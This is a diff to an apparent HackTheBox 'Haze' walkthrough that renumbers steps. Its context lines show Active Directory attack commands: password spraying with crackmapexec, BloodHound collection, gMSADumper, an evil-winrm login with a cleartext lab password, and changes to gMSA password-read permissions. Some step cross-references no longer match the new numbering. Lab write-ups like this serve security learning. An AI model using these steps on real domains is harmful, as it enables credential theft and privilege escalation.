@@ -163,14 +163,14 @@ it.
 
 ![](Haze/media/image17.png)
 
-**12.1** INFO: PASSWORD SPRAYING worked for USER mark.adams
+**13** INFO: PASSWORD SPRAYING worked for USER mark.adams
 
 **RUN:** **crackmapexec smb haze.htb -u \"usernames.txt\" -p
 \"Ld@p_Auth_Sp1unk@2k24\"**
 
 ![](Haze/media/image18.png)
 
-**13.** INFO: Download JSON-files (in this case JSON-files are located in
+**14.** INFO: Download JSON-files (in this case JSON-files are located in
 ZIP-file)
 
 **RUN:** **bloodhound-python -u \'mark.adams\' -p
@@ -192,7 +192,7 @@ issue.
 
 ![](Haze/media/image20.png)
 
-**14.** INFO: Start
+**15.** INFO: Start
 
 **RUN: sudo neo4j console (This starts the service)**
 
@@ -204,7 +204,7 @@ Start Bloodhound: Login with credentials
 
 **User:** neo4j **Password:** as163452
 
-**15.** INFO: Search for USER mark.adams
+**15.1** INFO: Search for USER mark.adams
 
 FOUND: USER mark.adams is MEMBER of <GMSA_MANAGERS@HAZE.HTB>
 
@@ -214,7 +214,7 @@ FOUND: USER mark.adams is MEMBER of <GMSA_MANAGERS@HAZE.HTB>
 
 **https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword**
 
-**15.1** INFO: Try reading the Password
+**15.2** INFO: Try reading the Password
 
 **Download:
 https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py**
@@ -230,19 +230,19 @@ https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py**
 
 **IMPORTANT: GMSA is not a GROUP, but a SPECIAL ACCOUNT TYPE**
 
-**15.2** INFO: Try POWERSHELL WinRM login with mark.adams
+**15.3** INFO: Try POWERSHELL WinRM login with mark.adams
 
 **RUN:** **evil-winrm -i 10.10.11.61 -u mark.adams -p
 Ld@p_Auth_Sp1unk@2k24**
 
-**15.3** INFO: Check Account type of **Haze-IT-Backup\$**
+**15.4** INFO: Check Account type of **Haze-IT-Backup\$**
 
 **RUN loggedin on POWERSHELL:** **Get-ADServiceAccount -Identity
 Haze-IT-Backup\$ \| Select-Object Name, ObjectClass**
 
 ![](Haze/media/image23.png)
 
-**15.4** INFO: Who has permission to see his password, ONLY DOMAIN
+**15.5** INFO: Who has permission to see his password, ONLY DOMAIN
 ADMINS!
 
 **By running this command, you can see which users, groups, or computers
@@ -255,7 +255,7 @@ PrincipalsAllowedToRetrieveManagedPassword**
 
 ![](Haze/media/image24.png)
 
-**15.5** INFO: Mark.adams belongs to GMSA administrator group. Try to
+**15.6** INFO: Mark.adams belongs to GMSA administrator group. Try to
 mod the READABLE USER
 
 **IMPORTANT: All commands, STEPS 15.6 & 15.7 have to be DONE FAST,
@@ -272,7 +272,7 @@ PrincipalsAllowedToRetrieveManagedPassword**
 
 ![](Haze/media/image25.png)
 
-**15.6** INFO: Try reading Password, see STEP 15.2
+**15.7** INFO: Try reading Password, see STEP 15.2
 
 **IMPORTANT: This command has to been run, so that STEP 19.1 works
 out**
